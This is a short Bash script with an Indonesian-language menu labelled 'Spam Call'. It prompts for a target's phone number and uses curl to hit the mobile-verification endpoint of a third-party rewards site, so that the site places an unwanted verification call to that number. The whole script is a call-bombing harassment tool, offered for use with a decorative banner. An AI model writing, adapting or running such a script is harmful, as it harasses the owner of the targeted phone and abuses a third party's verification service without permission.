#!/bin/bash
clear
toilet -f big -F gay Telepon
sleep 1
echo "+===========================================+" | lolcat
sleep 0.1
echo '
      [1] Spam Call
      [2] exit ' | lolcat
read -p ">>>>>>> " pp;
if [ $pp = "1" ]
then
    echo
    echo 'Input nomor seperti ini "8************' | lolcat
    sleep 1
    read -p "Masukan Nomor Target = " trget;
    link="https://id.jagreward.com/member/verify-mobile/$trget"
    curl -s $link
elif [ $pp = "2" ]
then
    sleep 1
    echo "ThX" | lolcat
    exit
else
    exit
fi
